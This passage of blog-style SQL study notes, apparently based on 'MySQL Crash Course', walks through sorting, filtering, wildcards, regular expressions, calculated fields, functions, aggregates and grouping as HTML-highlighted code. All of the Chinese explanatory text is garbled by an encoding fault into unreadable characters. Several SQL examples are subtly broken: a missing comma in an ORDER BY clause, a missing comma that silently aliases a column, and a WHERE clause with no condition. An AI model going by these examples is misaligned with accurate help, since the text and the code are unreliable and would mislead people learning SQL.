href="#4-7-ä½¿ç”¨å®Œå…¨é™å®šçš„è¡¨å" class="headerlink" title="4.7 ä½¿ç”¨å®Œå…¨é™å®šçš„è¡¨å"></a>4.7 ä½¿ç”¨å®Œå…¨é™å®šçš„è¡¨å</h2><p>å®Œå…¨é™å®šçš„åˆ—å, å³è¡¨ååŠ åˆ—å:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> products.prod_name<br><span class="hljs-keyword">FROM</span> products;<br></code></pre></td></tr></table></figure><p>å®Œå…¨é™å®šçš„è¡¨å, å³æ•°æ®åº“ååŠ è¡¨å.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> products.prod_name<br><span class="hljs-keyword">FROM</span> crashcourse.products;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬5ç« -æ’åºæ£€ç´¢æ•°æ®"><a href="#ç¬¬5ç« -æ’åºæ£€ç´¢æ•°æ®" class="headerlink" title="ç¬¬5ç«  æ’åºæ£€ç´¢æ•°æ®"></a>ç¬¬5ç«  æ’åºæ£€ç´¢æ•°æ®</h1><h2 id="5-1-æ’åºæ•°æ®"><a href="#5-1-æ’åºæ•°æ®" class="headerlink" title="5.1 æ’åºæ•°æ®"></a>5.1 æ’åºæ•°æ®</h2><p>å…³ç³»æ•°æ®åº“è®¾è®¡ç†è®ºè®¤ä¸º, å¦‚æœä¸æ˜ç¡®è§„å®šæ’åºé¡ºåº, åˆ™ä¸åº”è¯¥å‡å®šæ£€ç´¢å‡ºçš„æ•°æ®çš„é¡ºåºæœ‰æ„ä¹‰.</p><p><mark>æ˜ç¡®æ’åºç”¨ <code>SELECT</code> è¯­å¥æ£€ç´¢å‡ºçš„æ•°æ®</mark> , ä½¿ç”¨ <code>ORDER BY</code> å­å¥.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_name;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸€å­—æ¯é¡ºåºæ’åˆ—.</p><h2 id="5-2-æŒ‰å¤šä¸ªåˆ—æ’åº"><a href="#5-2-æŒ‰å¤šä¸ªåˆ—æ’åº" class="headerlink" title="5.2 æŒ‰å¤šä¸ªåˆ—æ’åº"></a>5.2 æŒ‰å¤šä¸ªåˆ—æ’åº</h2><p>å³ä¸€æ¬¡æ’åºå¤šä¸ªåˆ—:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_price, prod_name;<br></code></pre></td></tr></table></figure><h2 id="5-3-æŒ‡å®šæ’åºæ–¹å‘"><a href="#5-3-æŒ‡å®šæ’åºæ–¹å‘" class="headerlink" title="5.3 æŒ‡å®šæ’åºæ–¹å‘"></a>5.3 æŒ‡å®šæ’åºæ–¹å‘</h2><p>é»˜è®¤å‡åº, ä¹Ÿå¯æŒ‡å®š <code>ASC</code> (ascending). </p><p>é™åº (descending):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_price <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><p>å…ˆä»¥é™åºä¸ºåŸºç¡€æ’åºäº§å“, å†å¯¹äº§å“åæ’åº (æ¯”å¦‚è¿™é‡Œå°±æ˜¯ price ç›¸åŒçš„å°±ä¼šä»¥ name æ’åº):</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_price <span class="hljs-keyword">DESC</span> prod_name;<br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹, A è¢«è§†ä¸ºä¸ a ç›¸åŒ.</p><p>è¿”å›æœ€é«˜:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_price<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_price <span class="hljs-keyword">DESC</span><br>LIMIT <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬6ç« -è¿‡æ»¤æ•°æ®"><a href="#ç¬¬6ç« -è¿‡æ»¤æ•°æ®" class="headerlink" title="ç¬¬6ç«  è¿‡æ»¤æ•°æ®"></a>ç¬¬6ç«  è¿‡æ»¤æ•°æ®</h1><h2 id="6-1-ä½¿ç”¨-WHERE-å­å¥"><a href="#6-1-ä½¿ç”¨-WHERE-å­å¥" class="headerlink" title="6.1 ä½¿ç”¨ WHERE å­å¥"></a>6.1 ä½¿ç”¨ WHERE å­å¥</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_name, prod_price<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_price <span class="hljs-operator">=</span> <span class="hljs-number">2.50</span>;<br></code></pre></td></tr></table></figure><p>åŒæ—¶ä½¿ç”¨ <code>ORDER BY</code> å’Œ <code>WHERE</code> å­å¥æ—¶, åº”è¯¥è®© <code>ORDER BY</code> ä½äº <code>WHERE</code> ä¹‹å. </p><h2 id="6-2-WHERE-å­å¥æ“ä½œç¬¦"><a href="#6-2-WHERE-å­å¥æ“ä½œç¬¦" class="headerlink" title="6.2 WHERE å­å¥æ“ä½œç¬¦"></a>6.2 WHERE å­å¥æ“ä½œç¬¦</h2><p><img src="/../img/where_opes.png"></p><p><mark>å•å¼•å·</mark> ç”¨æ¥é™å®šå­—ç¬¦ä¸².</p><p><code>BETWEEN</code> æŒ‡å®šèŒƒå›´:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_name, prod_price<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_price <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">5</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><h3 id="6-2-4-ç©ºå€¼æ£€æŸ¥"><a href="#6-2-4-ç©ºå€¼æ£€æŸ¥" class="headerlink" title="6.2.4 ç©ºå€¼æ£€æŸ¥"></a>6.2.4 ç©ºå€¼æ£€æŸ¥</h3><p><code>IS NULL</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_price <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬7ç« -æ•°æ®è¿‡æ»¤"><a href="#ç¬¬7ç« -æ•°æ®è¿‡æ»¤" class="headerlink" title="ç¬¬7ç«  æ•°æ®è¿‡æ»¤"></a>ç¬¬7ç«  æ•°æ®è¿‡æ»¤</h1><p><code>AND</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-operator">=</span> <span class="hljs-number">1003</span> <span class="hljs-keyword">AND</span> prod_price <span class="hljs-operator">&lt;=</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p><code>OR</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-operator">=</span> <span class="hljs-number">1003</span> <span class="hljs-keyword">OR</span> prod_price <span class="hljs-operator">&lt;=</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>()</code> æ˜ç¡®åˆ†ç»„:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> (vend_id <span class="hljs-operator">=</span> <span class="hljs-number">1002</span> <span class="hljs-keyword">OR</span> vend_id <span class="hljs-operator">=</span> <span class="hljs-number">1003</span>) <span class="hljs-keyword">AND</span> prod_price <span class="hljs-operator">&lt;=</span> <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure><p><code>IN</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1002</span>,<span class="hljs-number">1003</span>)<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_name;<br></code></pre></td></tr></table></figure><p><code>NOT</code>, å¦å®šå®ƒä¹‹åè·Ÿçš„ä»»ä½•æ¡ä»¶:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_price, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<span class="hljs-number">1002</span>,<span class="hljs-number">1003</span>)<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_name;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬8ç« -ç”¨é€šé…ç¬¦è¿›è¡Œè¿‡æ»¤"><a href="#ç¬¬8ç« -ç”¨é€šé…ç¬¦è¿›è¡Œè¿‡æ»¤" class="headerlink" title="ç¬¬8ç«  ç”¨é€šé…ç¬¦è¿›è¡Œè¿‡æ»¤"></a>ç¬¬8ç«  ç”¨é€šé…ç¬¦è¿›è¡Œè¿‡æ»¤</h1><h2 id="8-1-LIKE-æ“ä½œç¬¦"><a href="#8-1-LIKE-æ“ä½œç¬¦" class="headerlink" title="8.1 LIKE æ“ä½œç¬¦"></a>8.1 LIKE æ“ä½œç¬¦</h2><p>ä¹Ÿå°±æ˜¯æ¨¡ç³ŠæŸ¥æ‰¾. æœ‰ç‚¹åƒæ­£åˆ™. ä½¿ç”¨è¿™ç§æ¨¡å¼å°±éœ€è¦ <code>LIKE</code> æ“ä½œç¬¦.</p><p><code>%</code> è¡¨ç¤ºä»»ä½•å­—ç¬¦å‡ºç°ä»»æ„æ¬¡æ•°. (ç›¸å½“äºæ­£åˆ™é‡Œé¢çš„ <code>.*</code> å³ä»»æ„å­—ç¬¦)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id, prod_name<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;jet%&#x27;</span><br></code></pre></td></tr></table></figure><p><code>_</code> åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦. (ç›¸å½“äºæ­£åˆ™é‡Œçš„ <code>.</code>)</p><h1 id="ç¬¬9ç« -ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢"><a href="#ç¬¬9ç« -ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢" class="headerlink" title="ç¬¬9ç«  ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢"></a>ç¬¬9ç«  ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæœç´¢</h1><p>ä½¿ç”¨ <code>REGEXP</code> æ“ä½œç¬¦:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_name <br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_name REGEXP <span class="hljs-string">&#x27;1000&#x27;</span><br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> prod_name<br></code></pre></td></tr></table></figure><p>å¯ç”¨å…ƒå­—ç¬¦:</p><ul><li><code>.</code></li><li><code>|</code></li><li><code>[]</code></li><li><code>$</code> å’Œ <code>^</code></li><li><code>*</code></li><li><code>+</code></li><li><code>?</code></li><li><code>&#123;n,m&#125;</code></li></ul><p><img src="/../img/sql_regex.png"></p><h1 id="ç¬¬10ç« -åˆ›å»ºè®¡ç®—å­—æ®µ"><a href="#ç¬¬10ç« -åˆ›å»ºè®¡ç®—å­—æ®µ" class="headerlink" title="ç¬¬10ç«  åˆ›å»ºè®¡ç®—å­—æ®µ"></a>ç¬¬10ç«  åˆ›å»ºè®¡ç®—å­—æ®µ</h1><p><code>Concat()</code> å‡½æ•°, æ‹¼æ¥ä¸¤ä¸ªåˆ—:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Concat(vend_name, <span class="hljs-string">&#x27; (&#x27;</span>, vend_country, <span class="hljs-string">&#x27;)&#x27;</span>)<br><span class="hljs-keyword">FROM</span> vendors<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> vend_name<br></code></pre></td></tr></table></figure><p><code>RTrim()</code> å‡½æ•° (â€œRâ€ æŒ‡ â€œRightâ€, è¿˜æœ‰ <code>LTrim()</code>), å»æ‰å€¼å³è¾¹çš„æ‰€æœ‰ç©ºæ ¼:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Concat(RTrim(vend_name), <span class="hljs-string">&#x27; (&#x27;</span>, RTrim(vend_country), <span class="hljs-string">&#x27;)&#x27;</span>)<br><span class="hljs-keyword">FROM</span> vendors<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> vend_name<br></code></pre></td></tr></table></figure><p>è®¾ç½®åˆ«å, ä½¿ç”¨ <code>AS</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Concat(RTrim(vend_name), <span class="hljs-string">&#x27; (&#x27;</span>, RTrim(vend_country), <span class="hljs-string">&#x27;)&#x27;</span>) <span class="hljs-keyword">AS</span> vend_title<br><span class="hljs-keyword">FROM</span> vendors<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> vend_name<br></code></pre></td></tr></table></figure><h2 id="10-3-æ‰§è¡Œç®—æœ¯è®¡ç®—"><a href="#10-3-æ‰§è¡Œç®—æœ¯è®¡ç®—" class="headerlink" title="10.3 æ‰§è¡Œç®—æœ¯è®¡ç®—"></a>10.3 æ‰§è¡Œç®—æœ¯è®¡ç®—</h2><p>å¯ç”¨ç®—æœ¯æ“ä½œç¬¦:</p><ul><li><code>+</code></li><li><code>-</code></li><li><code>*</code></li><li><code>/</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> prod_id<br>       quantity,<br>       item_price,<br>       quantity<span class="hljs-operator">*</span>item_price <span class="hljs-keyword">AS</span> expanded_price<br><span class="hljs-keyword">FROM</span> orderitems<br><span class="hljs-keyword">WHERE</span> order_num <span class="hljs-operator">=</span> <span class="hljs-number">20005</span>;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬11ç« -ä½¿ç”¨æ•°æ®å¤„ç†å‡½æ•°"><a href="#ç¬¬11ç« -ä½¿ç”¨æ•°æ®å¤„ç†å‡½æ•°" class="headerlink" title="ç¬¬11ç«  ä½¿ç”¨æ•°æ®å¤„ç†å‡½æ•°"></a>ç¬¬11ç«  ä½¿ç”¨æ•°æ®å¤„ç†å‡½æ•°</h1><p>ç›¸å¯¹æ¥è¯´, å¤šæ•° SQL è¯­å¥æ˜¯å¯ç§»æ¤çš„, è€Œå‡½æ•°çš„å¯ç§»æ¤æ€§å´æ­¥æª.</p><h2 id="11-2-ä½¿ç”¨å‡½æ•°"><a href="#11-2-ä½¿ç”¨å‡½æ•°" class="headerlink" title="11.2 ä½¿ç”¨å‡½æ•°"></a>11.2 ä½¿ç”¨å‡½æ•°</h2><h3 id="11-2-1-æ–‡æœ¬å¤„ç†"><a href="#11-2-1-æ–‡æœ¬å¤„ç†" class="headerlink" title="11.2.1 æ–‡æœ¬å¤„ç†"></a>11.2.1 æ–‡æœ¬å¤„ç†</h3><p><code>Upper()</code>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_name, <span class="hljs-built_in">Upper</span>(vend_name) <span class="hljs-keyword">AS</span> vend_name_upcase<br><span class="hljs-keyword">FROM</span> vendors<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> vend_name;<br></code></pre></td></tr></table></figure><p>å¸¸ç”¨å‡½æ•°:</p><p><img src="/../img/sql_string_func1.png"></p><p><img src="/../img/sql_string_func2.png"></p><p><code>SOUNDEX</code> æ˜¯ä¸€ä¸ªå°†ä»»ä½•æ–‡æœ¬ä¸²è½¬æ¢ä¸ºæè¿°å…¶<mark>è¯­éŸ³è¡¨ç¤ºçš„å­—æ¯æ•°å­—æ¨¡å¼</mark>çš„ç®—æ³•.</p><p>å¦‚, åŒ¹é…æ‰€æœ‰å‘éŸ³ç±»ä¼¼äº <code>Y.Lie</code> çš„è”ç³»å:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> cust_name, cust_contact<br><span class="hljs-keyword">FROM</span> customers<br><span class="hljs-keyword">WHERE</span> Soundex(cust_contact) <span class="hljs-operator">=</span> Soundex(<span class="hljs-string">&#x27;Y Lie&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="11-2-2-æ—¥æœŸå’Œæ—¶é—´å¤„ç†å‡½æ•°"><a href="#11-2-2-æ—¥æœŸå’Œæ—¶é—´å¤„ç†å‡½æ•°" class="headerlink" title="11.2.2 æ—¥æœŸå’Œæ—¶é—´å¤„ç†å‡½æ•°"></a>11.2.2 æ—¥æœŸå’Œæ—¶é—´å¤„ç†å‡½æ•°</h3><p><img src="/../img/sql_time_func1.png"></p><p>æ£€ç´¢åŸºæœ¬æ—¥æœŸ:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> cust_id, order_num<br><span class="hljs-keyword">FROM</span> orders<br><span class="hljs-keyword">WHERE</span> order_date <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;2005-09-01&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>datetime</code> æ•°æ®ç±»å‹, å­˜å‚¨æ—¥æœŸåŠæ—¶é—´å€¼. </p><p>å’Œæ—¥æœŸç›¸å…³, éƒ½ä½¿ç”¨ <code>Date()</code> å‡½æ•°:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> cust_id, order_num<br><span class="hljs-keyword">FROM</span> orders<br><span class="hljs-keyword">WHERE</span> <span class="hljs-type">Date</span>(order_date) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;2005-09-01&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="11-2-3-æ•°å€¼å¤„ç†å‡½æ•°"><a href="#11-2-3-æ•°å€¼å¤„ç†å‡½æ•°" class="headerlink" title="11.2.3 æ•°å€¼å¤„ç†å‡½æ•°"></a>11.2.3 æ•°å€¼å¤„ç†å‡½æ•°</h3><p>åœ¨ä¸»è¦ DBMS çš„å‡½æ•°ä¸­, æ•°å€¼å‡½æ•°æ˜¯æœ€ä¸€è‡´æœ€ç»Ÿä¸€çš„å‡½æ•°.</p><p><img src="/../img/sql_num_func1.png"></p><h1 id="ç¬¬12ç« -æ±‡æ€»æ•°æ®"><a href="#ç¬¬12ç« -æ±‡æ€»æ•°æ®" class="headerlink" title="ç¬¬12ç«  æ±‡æ€»æ•°æ®"></a>ç¬¬12ç«  æ±‡æ€»æ•°æ®</h1><h2 id="12-1-èšé›†å‡½æ•°"><a href="#12-1-èšé›†å‡½æ•°" class="headerlink" title="12.1 èšé›†å‡½æ•°"></a>12.1 èšé›†å‡½æ•°</h2><p>ä¹Ÿå°±æ˜¯å¯¹æŸä¸€åˆ—åšè®¡ç®—:</p><p><img src="/../img/sql_converge_func1.png"></p><p><code>AVG()</code> :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(prod_price) <span class="hljs-keyword">AS</span> avg_price<br><span class="hljs-keyword">FROM</span> products;<br></code></pre></td></tr></table></figure><p><code>COUNT()</code> :</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> num_cust<br><span class="hljs-keyword">FROM</span> customers;<br></code></pre></td></tr></table></figure><h2 id="12-2-èšé›†ä¸åŒçš„å€¼"><a href="#12-2-èšé›†ä¸åŒçš„å€¼" class="headerlink" title="12.2 èšé›†ä¸åŒçš„å€¼"></a>12.2 èšé›†ä¸åŒçš„å€¼</h2><p>å°±æ˜¯å€¼ç›¸åŒçš„æŸä¸€è¡Œçš„å€¼ä¸èšé›†èµ·æ¥.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(<span class="hljs-keyword">DISTINCT</span> prod_price) <span class="hljs-keyword">AS</span> avg_price<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> vend_id <span class="hljs-operator">=</span> <span class="hljs-number">1003</span>;<br></code></pre></td></tr></table></figure><p>é»˜è®¤æ˜¯ <code>ALL</code>.</p><h2 id="12-3-ç»„åˆèšåˆå‡½æ•°"><a href="#12-3-ç»„åˆèšåˆå‡½æ•°" class="headerlink" title="12.3 ç»„åˆèšåˆå‡½æ•°"></a>12.3 ç»„åˆèšåˆå‡½æ•°</h2><p>ä¹Ÿå°±æ˜¯åœ¨ <code>SELECT</code> è¯­å¥ä¸­åŒ…å«å¤šä¸ªèšé›†å‡½æ•°.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> num_items,<br>       <span class="hljs-built_in">MIN</span>(prod_price) <span class="hljs-keyword">AS</span> price_min,<br>       <span class="hljs-built_in">MAX</span>(prod_price) <span class="hljs-keyword">AS</span> price_max,<br>       <span class="hljs-built_in">AVG</span>(prod_price) <span class="hljs-keyword">AS</span> price_avg<br><span class="hljs-keyword">FROM</span> products;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬13ç« -åˆ†ç»„æ•°æ®"><a href="#ç¬¬13ç« -åˆ†ç»„æ•°æ®" class="headerlink" title="ç¬¬13ç«  åˆ†ç»„æ•°æ®"></a>ç¬¬13ç«  åˆ†ç»„æ•°æ®</h1><h2 id="13-2-åˆ›å»ºåˆ†ç»„"><a href="#13-2-åˆ›å»ºåˆ†ç»„" class="headerlink" title="13.2 åˆ›å»ºåˆ†ç»„"></a>13.2 åˆ›å»ºåˆ†ç»„</h2><p><code>GROUP BY</code> å³è®©æ•°æ®ä»¥æŸä¸€åˆ—æ¥æ’åº:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_id, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> num_prods<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> vend_id<br></code></pre></td></tr></table></figure><h2 id="13-3-è¿‡æ»¤åˆ†ç»„"><a href="#13-3-è¿‡æ»¤åˆ†ç»„" class="headerlink" title="13.3 è¿‡æ»¤åˆ†ç»„"></a>13.3 è¿‡æ»¤åˆ†ç»„</h2><p><code>HAVING</code> ç±»ä¼¼äº <code>WHERE</code>, ç›®å‰ä¸ºæ­¢æ‰€æœ‰å­¦è¿‡çš„ç±»å‹çš„ <code>WHERE</code> å­å¥éƒ½å¯ä»¥ç”¨ <code>HAVING</code> æ¥ä»£æ›¿. å”¯ä¸€çš„å·®åˆ«æ˜¯ <code>WHERE</code> è¿‡æ»¤è¡Œ, <code>HAVING</code> è¿‡æ»¤åˆ†ç»„. </p><p><mark>ä¸€ç§ç†è§£æ–¹æ³•</mark>:</p><ul><li><code>WHERE</code> åœ¨æ•°æ®åˆ†ç»„å‰è¿›è¡Œè¿‡æ»¤</li><li><code>HAVING</code> åœ¨æ•°æ®åˆ†ç»„åè¿›è¡Œè¿‡æ»¤</li></ul><p>æ³¨æ„ <code>HAVING</code> çš„ä½ç½®:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> vend_id, <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> num_prods<br><span class="hljs-keyword">FROM</span> products<br><span class="hljs-keyword">WHERE</span> prod_price<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> vend_id<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">&gt;=</span> <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><h2 id="13-4-åˆ†ç»„å’Œæ’åº"><a href="#13-4-åˆ†ç»„å’Œæ’åº" class="headerlink" title="13.4 åˆ†ç»„å’Œæ’åº"></a>13.4 åˆ†ç»„å’Œæ’åº</h2><p><code>ORDER BY</code> å’Œ <code>GROUP BY</code> çš„åŒºåˆ«:</p><p><img src="/../img/the_difference_of_ORDER_BY_and_GROUP_BY.png"></p><p>ä¸€èˆ¬åœ¨ä½¿ç”¨ <code>GROUP BY</code> å­å¥æ—¶, 